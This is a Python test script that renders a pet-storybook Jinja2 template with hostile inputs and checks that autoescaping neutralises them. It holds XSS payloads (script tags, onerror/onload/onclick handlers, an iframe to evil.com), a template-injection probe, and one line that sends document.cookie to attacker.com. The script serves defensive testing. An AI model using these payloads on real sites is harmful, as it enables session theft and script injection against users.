import io
from jinja2 import Environment, FileSystemLoader

env = Environment(loader=FileSystemLoader('templates/petstory_v1'), autoescape=True)
tmpl = env.get_template('template.html')

hostile_payloads = {
    'pet_name': '<script>alert("XSS_PET_NAME")</script>',
    'pet_type': 'dog',
    'book_purpose': 'gift',
    'life_stage': 'young',
    'origin_type': 'rescue',
    'nicknames': '<img src="x" onerror="alert(1)">',
    'breed_description': '<b>Golden Retriever</b> & <iframe src="evil.com"></iframe>',
    'gotcha_date': '2023-01-01"><script>alert(2)</script>',
    'home_city': 'Manila City &lt;script&gt;',
    'personality_traits': ['<svg onload=alert(3)>', 'Loyal & Brave'],
    'quirks': ['" onclick="alert(4)"', 'Eats homework'],
    'owner_names': '<b>Papa</b> & "Mama" <script>alert(5)</script>',
    'dedication_text': '{{ 7 * 7 }} <script>document.location="http://attacker.com?cookie="+document.cookie</script>',
    'palette_id': 'sage_meadow',
    'icon_id': 'crest_star'
}

rendered = tmpl.render(answers=hostile_payloads, photos={})

# Security Invariant Checks
checks = [
    ('<script>', False, "Raw unescaped <script> tag present"),
    ('<img src="x"', False, "Raw unescaped <img src=> attribute present"),
    ('<iframe', False, "Raw unescaped <iframe> tag present"),
    ('<svg onload', False, "Raw unescaped <svg onload> tag present"),
    ('" onclick="', False, "Raw unescaped onclick attribute present"),
    ('&lt;script&gt;alert(&#34;XSS_PET_NAME&#34;)&lt;/script&gt;', True, "Properly HTML-escaped pet_name"),
    ('&lt;img src=&#34;x&#34; onerror=&#34;alert(1)&#34;&gt;', True, "Properly HTML-escaped img payload"),
    ('&lt;iframe src=&#34;evil.com&#34;&gt;&lt;/iframe&gt;', True, "Properly HTML-escaped iframe"),
    ('{{ 7 * 7 }}', True, "Template injection prevented (rendered verbatim text, not 49)")
]

all_passed = True
print("="*70)
print("HOSTILE INPUT JINJA2 SANITIZATION AUDIT (QG-R3)")
print("="*70)
for pattern, expected_presence, description in checks:
    present = pattern in rendered
    status = "PASS" if present == expected_presence else "FAIL"
    if status == "FAIL":
        all_passed = False
    print(f"[{status}] {description:50} | Found: {present}")

print("="*70)
print(f"OVERALL JINJA2 HOSTILE INPUT VERIFICATION: {'PASS' if all_passed else 'FAIL'}")
